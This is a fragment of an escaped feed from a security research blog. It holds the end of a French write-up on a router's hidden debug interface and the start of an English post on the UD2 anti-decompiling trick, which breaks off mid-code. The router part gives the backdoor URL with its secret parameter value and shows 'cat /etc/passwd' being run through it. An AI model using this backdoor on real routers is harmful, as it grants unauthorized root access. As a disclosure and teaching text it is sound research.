&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">get_value&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">DAT_00477bb0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">auStack_238&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(((&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">memcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">auStack_238&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">DAT_00477bb4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">||&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">((((&lt;/span>&lt;span class="n">iVar1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">get_value&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">param_1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s">&amp;#34;aaksjdkfj&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">local_118&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">iVar1&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(((&lt;/span>&lt;span class="n">local_118&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;#&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_117&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;n&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_116&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;o&amp;#39;&lt;/span>&lt;span class="p">))))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">((((&lt;/span>&lt;span class="n">local_115&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;t&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_114&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;e&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_113&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;n&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">((&lt;/span>&lt;span class="n">local_112&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;o&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_111&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;u&amp;#39;&lt;/span>&lt;span class="p">))))))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(((&lt;/span>&lt;span class="n">local_110&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;g&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">((((&lt;/span>&lt;span class="n">local_10f&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;h&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_10e&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;m&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_10d&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;i&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">((&lt;/span>&lt;span class="n">local_10c&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;n&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_10b&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;e&amp;#39;&lt;/span>&lt;span class="p">))))))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">(((&lt;/span>&lt;span class="n">local_10a&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;r&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">local_109&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;a&amp;#39;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_108&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;l&amp;#39;&lt;/span>&lt;span class="p">))))&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">local_107&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="sc">&amp;#39;^&amp;#39;&lt;/span>&lt;span class="p">))))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">))))&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">...&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Paramètre&lt;/th>
&lt;th>Valeur&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>act&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>aaksjdkfj&lt;/td>
&lt;td>#notenoughmineral^&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;blockquote>
&lt;p>&lt;strong>En résumé :&lt;/strong> il est possible d&amp;rsquo;accéder à l&amp;rsquo;interface cachée via &lt;a
class="gblog-markdown__link"
href="http://IP_ROUTEUR/cgi-bin/d.cgi?act=1&amp;amp;aaksjdkfj=#notenoughmineral%5e"
>http://IP_ROUTEUR/cgi-bin/d.cgi?act=1&amp;amp;aaksjdkfj=#notenoughmineral^&lt;/a>&lt;/p>&lt;/blockquote>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h1 id="r00t"
>
R00T
&lt;/h1>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#r00t" class="gblog-post__anchor clip flex align-center" aria-label="Anchor R00T" href="#r00t">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;figure style="text-align: center;">&lt;img src="/img/toto/cmd-1.png" />&lt;figcaption style="text-align: center;">Interface de "debug"&lt;/figcaption>&lt;/figure>
&lt;figure style="text-align: center;">&lt;img src="/img/toto/cmd-2.png" />&lt;figcaption style="text-align: center;">cat /etc/passwd&lt;/figcaption>&lt;/figure>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h1 id="références"
>
Références
&lt;/h1>
&lt;a data-clipboard-text="https://0x09.dev/posts/toto_decouvre_une_interface_de_debug/#références" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Références" href="#r%c3%a9f%c3%a9rences">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;ul>
&lt;li>[1] &lt;a
class="gblog-markdown__link"
href="https://nvd.nist.gov/vuln/detail/CVE-2025-52089"
>https://nvd.nist.gov/vuln/detail/CVE-2025-52089&lt;/a>&lt;/li>
&lt;li>[2] &lt;a
class="gblog-markdown__link"
href="https://depier.re/old/understanding_iptime_configuration_backup_file_format.html"
>https://depier.re/old/understanding_iptime_configuration_backup_file_format.html&lt;/a>&lt;/li>
&lt;li>[3] &lt;a
class="gblog-markdown__link"
href="https://github.com/DePierre/iptime_utils/tree/master"
>https://github.com/DePierre/iptime_utils/tree/master&lt;/a>&lt;/li>
&lt;/ul></content><category scheme="https://0x09.dev/authors/skander-belabed" term="skander-belabed" label="skander-belabed"/><category scheme="https://0x09.dev/tags/Reverse-engineering" term="Reverse-engineering" label="Reverse engineering"/><category scheme="https://0x09.dev/tags/Security" term="Security" label="Security"/><category scheme="https://0x09.dev/tags/Hardware" term="Hardware" label="Hardware"/></entry><entry><title>Undifined but simple anti-decompiling instruction</title><link href="https://0x09.dev/posts/undifined_but_simple_anti_decompiler/" rel="alternate" type="text/html" hreflang="en"/><id>https://0x09.dev/posts/undifined_but_simple_anti_decompiler/</id><author><name>Skander BELABED</name></author><published>2022-03-12T15:37:43+01:00</published><updated>2025-05-17T15:23:05+02:00</updated><content type="html">
&lt;hr>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h1 id="tldr"
>
TL;DR
&lt;/h1>
&lt;a data-clipboard-text="https://0x09.dev/posts/undifined_but_simple_anti_decompiler/#tldr" class="gblog-post__anchor clip flex align-center" aria-label="Anchor TL;DR" href="#tldr">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>UD2 is an x86 assembly instruction that simulates an invalid opcode and mostly used for testing purposes, but not only. Indeed it can be used by malware authors for example to disturbe the decompilation process of the malware.&lt;/p>
&lt;hr>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h1 id="ud2-instruction"
>
UD2 instruction
&lt;/h1>
&lt;a data-clipboard-text="https://0x09.dev/posts/undifined_but_simple_anti_decompiler/#ud2-instruction" class="gblog-post__anchor clip flex align-center" aria-label="Anchor UD2 instruction" href="#ud2-instruction">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>UD2 is an x86 assembly &lt;a
class="gblog-markdown__link"
href="https://en.wikipedia.org/wiki/Mnemonic"
>mnemonic&lt;/a> and stands for &lt;strong>U&lt;/strong>n&lt;strong>d&lt;/strong>efined instruction. Only used for testing purposes, this instruction simulates the presence of an invalid opcode in the code and when executed raises an &lt;em>Invalid opcode&lt;/em> exception.&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Opcode&lt;/th>
&lt;th>Mnemonic&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>0F 0B&lt;/td>
&lt;td>UD2&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="microsoft-visual-c-example"
>
Microsoft Visual C++ example
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/undifined_but_simple_anti_decompiler/#microsoft-visual-c-example" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Microsoft Visual C&amp;#43;&amp;#43; example" href="#microsoft-visual-c-example">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 5
&lt;/span>&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 8
&lt;/span>&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="hl">&lt;span class="lnt">10
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">11
&lt;/span>&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="hl">&lt;span class="lnt">20
&lt;/span>&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c++" data-lang="c++">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">//https://fr-academic.com/dic.nsf/frwiki/1672713
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;windows.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;iostream&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="kt">bool&lt;/span> &lt;span class="nf">__ud2&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">__try&lt;/span>&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="kr">__asm&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">UD2&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="kr">__except&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">GetExceptionCode&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">EXCEPTION_ILLEGAL_INSTRUCTION&lt;/span> &lt;span class="o">?&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nl">EXCEPTION_EXECUTE_HANDLER&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">EXCEPTION_CONTINUE_SEARCH&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nb">true&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nb">false&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="n">__ud2&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;Exception d&amp;#39;opcode invalide rencontrée&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">cout&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&lt;/span> &lt;span class="s">&amp;#34;Exception d&amp;#39;opcode invalide non rencontrée&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h1 id="anti-decompiling-purpose"
>
Anti-decompiling purpose
&lt;/h1>
&lt;a data-clipboard-text="https://0x09.dev/posts/undifined_but_simple_anti_decompiler/#anti-decompiling-purpose" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Anti-decompiling purpose" href="#anti-decompiling-purpose">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>By giving you the definition of &lt;a
class="gblog-markdown__link"
href=""
>UD2&lt;/a> instruction, I said that it&amp;rsquo;s &lt;strong>only&lt;/strong> used for testing purposes, well I lied. It could also be used as an anti-decomiling technique. To explain this usage, let&amp;rsquo;s see an example of a simple program.&lt;/p>
&lt;div class="flex align-center gblog-post__anchorwrap">
&lt;h2 id="simple-program"
>
Simple program
&lt;/h2>
&lt;a data-clipboard-text="https://0x09.dev/posts/undifined_but_simple_anti_decompiler/#simple-program" class="gblog-post__anchor clip flex align-center" aria-label="Anchor Simple program" href="#simple-program">
&lt;svg class="gblog-icon gblog_link">&lt;use xlink:href="#gblog_link">&lt;/use>&lt;/svg>
&lt;/a>
&lt;/div>
&lt;p>The following program checks if the program was executed with a parameter or exits, if it&amp;rsquo;s the case, he first checks if the length of the string passed as argument is equal to 18 and then is equal to the string &lt;em>G0od_Byp4ss_0f_UD2&lt;/em>. if the two conditions are not met he returns after printing a &lt;em>&amp;lsquo;Try again&amp;rsquo;&lt;/em> message.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 9
&lt;/span>&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="hl">&lt;span class="lnt">11
&lt;/span>&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="hl">&lt;span class="lnt">13
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">14
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">15
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">16
&lt;/span>&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="hl">&lt;span class="lnt">19
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">20
&lt;/span>&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="mi">2&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Usage : %s password&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">strlen&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">18&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nf">strcmp&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="s">&amp;#34;G0od_Byp4ss_0f_UD2&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Good boy.&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;Try again !&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now let&amp;rsquo;s decompile our program, for this example I&amp;rsquo;m using &lt;a
class="gblog-markdown__link"
href="https://ghidra-sre.org/"
>Ghidra&lt;/a>&amp;rsquo;s decompiler.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="hl">&lt;span class="lnt">13
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">14
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">15
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">16
&lt;/span>&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="hl">&lt;span class="lnt">19
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">20
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">21
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">22
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">23
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">24
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">25
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">26
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">27
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">28
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">29
&lt;/span>&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
